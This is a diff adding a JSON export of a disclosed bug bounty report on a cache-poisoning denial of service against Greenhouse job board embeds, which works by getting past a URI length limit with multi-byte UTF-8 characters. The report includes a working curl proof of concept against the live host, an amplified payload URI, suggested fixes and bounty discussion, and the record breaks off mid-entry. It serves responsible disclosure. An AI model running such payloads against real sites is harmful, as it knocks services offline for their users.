@@ -1,0 +1,424 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-08-17T14:22:19.525Z", 
+    "voters": [
+        "irvinlim", 
+        "miguel_santareno", 
+        "spam404", 
+        "kapytein", 
+        "mik317", 
+        "emitrani", 
+        "vinnyvinoth", 
+        "eveeez", 
+        "michan001", 
+        "babayaga_", 
+        "and 10 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "100.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 350847, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "## Summary\n\nThis is a bypass of the fix that was introduced in response to report #334709. The bug in question was that it was possible to poison the cache of the generated JS file at https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey, by appending a URL-encoded NULL byte (`%00`), followed by an arbitrary string of characters. I found in that report that it was possible to cause a denial of service by making the resultant `applicationURI` and `boardURI` parameters too long such that the server rejects any request, causing a `ERR_CONNECTION_CLOSED` error. As clarified with @rongutierrez, the temporary fix implemented in #334709 was to limit the length of the request URI, which was sufficient to prevent the DoS in my PoC in that report.\n\nHowever, even though I found that the length restriction was 1024 bytes, I managed to bypass this length restriction by using multi-byte UTF-8 characters, which get expanded into up to 12 URL-encoded bytes, which results in me being able to poison the cache once again, making the resultant `applicationURI` parameter greater than the limit allowed by the server, resulting in a DoS once again.\n\n## Description\n\nI found that the request URI was restricted to 1024 characters AFTER decoding, which was evident from trial and error. This meant that `%00` was treated as 1 character, even though the input was 3 bytes long. Since the number of characters is limited to 1024, we have the following:\n\n* 24 characters for the path segment, including the query string: `/embed/job_board/js?for=`\n* 1 character for the NULL byte `%00` _after_ decoding\n* Variable length in bytes for the board token, minimum 1 byte\n* 998 characters remaining for our payload\n\nThe length for the resultant URI (in bytes) we had to hit to cause a DoS, was at least 6169 bytes (approximately) as established in the previous report. This consists of:\n\n* 49 bytes for the URI prefix, including the hostname: `https://boards.greenhouse.io/embed/job_board?for=`\n* 3 bytes for the NULL byte `%00` _after_ encoding\n* Variable length in bytes for the board token, minimum 1 byte\n* 6116 bytes remaining that will arise from our payload\n\nMeanwhile, I had a theory that UTF-8 characters would be treated as a single character as well. This meant that for a single character like \"\u2665\", this is a 3-byte UTF-8 character, that gets URL encoded into `%E2%99%A5`, which is 9 bytes long. We can even use a 4-byte UTF-8 character which would give us 12 URL encoded bytes. This means that, even though we only have 998 characters, we can amplify this by up to a factor of 12x.\n\nTrue enough by sending a request, using \"\u2665\" as our repeated payload 992 times, we can poison the cache with an amplified result as follows:\n\n```sh\n#!/bin/sh\n\nREPEAT=992\nID=623145\ncurl --http1.1 -s \"https://boards.greenhouse.io/embed/job_board/js?for=a%00`python -c 'print(\\\"\u2665\\\" * '$REPEAT')'`$ID\" -v\n```\n\nThis produces the following URI for the `boardURI` parameter:\n\n```\nhttps://boards.greenhouse.io/embed/job_board?for=a%00%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5623145\n```\n\nThis is 8987 characters in the URI prefix alone, which is beyond the 6169 bytes limit that causes the `ERR_CONNECTION_CLOSED` error in the previous report. This results in a similar DoS which is not mitigated.\n\nThe execution log can be found in {F296561}.\n\n## Recommended Fix\n\nWe can see that the previously implemented fix to limit the length of the request URI string to 1024 characters was insufficient, since we only need 510 times 12 bytes of URL encoded 4-byte UTF-8 characters to cause a DoS, assuming that the board token is a single byte (`a`).\n\nAs mentioned in the previous report #334709, it is much, much more foolproof to perform a whitelisting of the board token in the URL.\n\nAlternatively, since it seems that this endpoint requires fetching of data from the database based on the board token that was extracted from the query string parameter, instead of reflecting the `for` parameter into the `boardURI`/`applicationURI` parameter in the JS file, why not take the value from the database instead, since it's guaranteed that it will not be unsafe?\n\nAlternatively, you can choose to limit the request length further to a smaller size (maybe less than 500), but if your application server is able to maybe read UTF-16 or UTF-32 this would come to the same result once again, though I don't think that it's really possible.\n\nThe recommended fix is really to not _reflect_ the untrusted user's input which would be reflected onto the cache-poisoned file, regardless if you validate the input query string parameter, or to just take the board token URI from the database and not the request URI. This would really ensure that the fix would be foolproof.\n\n## Impact\n\nAs reiterated in the previous reports, an attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "User"
+    }, 
+    "title": "Bypass of request line length limit to DoS via cache poisoning", 
+    "is_member_of_team?": null, 
+    "vote_count": 20, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "boards.greenhouse.io", 
+        "max_severity": "critical", 
+        "databaseId": 9058, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-09-16T14:22:19.615Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$100", 
+    "attachments": [
+        {
+            "file_name": "execution-log.txt", 
+            "type": "text/plain", 
+            "id": 296561, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/296/561/01436c4af0d16eb3043392d4c07e781c6e242e7c/execution-log.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221701Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd5926fe99ae3e1fecf1d048cc7bdb854035b04209ee4e5528cabf5ae113dc6a"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-16T15:54:05.001Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-16T15:54:05.001Z", 
+            "actor": {
+                "username": "rongutierrez", 
+                "url": "/rongutierrez", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "Hi @irvinlim,\n\nThank you for the writeup and bypass details. As I mentioned in the previous ticket we already have plans to improve this validation routine. We will provide you with an additional reward since you included some good suggestions on how to safely fix the issue.\n\nWe will keep this report open and I will notify you once we have released the fix. Thanks again!", 
+            "markdown_message": "<p>Hi <a href=\"/irvinlim\">@irvinlim</a>,</p>\n\n<p>Thank you for the writeup and bypass details. As I mentioned in the previous ticket we already have plans to improve this validation routine. We will provide you with an additional reward since you included some good suggestions on how to safely fix the issue.</p>\n\n<p>We will keep this report open and I will notify you once we have released the fix. Thanks again!</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2752025, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-05-16T15:54:20.748Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-16T15:54:20.748Z", 
+            "actor": {
+                "url": "/greenhouse", 
+                "profile": {
+                    "name": "Greenhouse.io"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/312/d8a5615eac371f9e26a4ab3e56b8c32370280a0c_medium.jpg?1412369170"
+                }
+            }, 
+            "team_handle": "greenhouse", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "100.0", 
+            "collaborator": {
+                "username": "irvinlim", 
+                "url": "/irvinlim"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2752027, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-16T15:55:14.621Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-16T15:55:14.621Z", 
+            "actor": {
+                "username": "irvinlim", 
+                "url": "/irvinlim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/182/993/6b3b063d650a8407f0a8b4ddec246be42b060b76_medium.jpg?1499865377"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "No problem, glad to help! And thanks for the additional bounty!", 
+            "markdown_message": "<p>No problem, glad to help! And thanks for the additional bounty!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2752031, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-16T16:06:04.854Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-16T16:06:04.854Z", 
+            "actor": {
+                "username": "irvinlim", 
+                "url": "/irvinlim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/182/993/6b3b063d650a8407f0a8b4ddec246be42b060b76_medium.jpg?1499865377"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "Actually after thinking about it, I believe this bypass should warrant the same bounty amount as previous reports even though it is reporting on the same bug with the same solution. If you reward bounties based on impact, this bypass is still able to achieve the exact same effect as the previous two reports, and hence I believe it should be rewarded as such.\n\nDo let me know if you disagree.", 
+            "markdown_message": "<p>Actually after thinking about it, I believe this bypass should warrant the same bounty amount as previous reports even though it is reporting on the same bug with the same solution. If you reward bounties based on impact, this bypass is still able to achieve the exact same effect as the previous two reports, and hence I believe it should be rewarded as such.</p>\n\n<p>Do let me know if you disagree.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2752071, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-16T16:34:41.305Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-16T16:34:41.305Z", 
+            "actor": {
+                "username": "rongutierrez", 
+                "url": "/rongutierrez", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "Our rationale behind the lower reward was because we let you know that a better fix was planned to prevent future bypasses. The proposed fix would have prevented this issue as well. We did want to at least give you a reward since you provided a PoC and a good recommendation. ", 
+            "markdown_message": "<p>Our rationale behind the lower reward was because we let you know that a better fix was planned to prevent future bypasses. The proposed fix would have prevented this issue as well. We did want to at least give you a reward since you provided a PoC and a good recommendation. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2752160, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-16T16:43:43.226Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-16T16:43:43.226Z", 
+            "actor": {
+                "username": "irvinlim", 
+                "url": "/irvinlim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/182/993/6b3b063d650a8407f0a8b4ddec246be42b060b76_medium.jpg?1499865377"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
